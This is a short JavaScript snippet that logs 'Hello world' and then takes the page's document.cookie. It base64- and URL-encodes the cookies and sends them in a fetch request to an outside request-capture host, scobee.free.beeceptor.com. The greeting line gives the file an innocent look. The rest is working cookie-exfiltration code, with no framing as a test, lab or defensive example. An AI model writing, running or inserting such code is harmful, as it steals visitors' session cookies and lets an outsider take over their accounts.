console.log('Hello world');

const encodedCookies = encodeURIComponent(btoa(document.cookie));
const params = new URLSearchParams();
params.append("cookies", encodedCookies);
const response = await fetch(`https://scobee.free.beeceptor.com?${params}`);

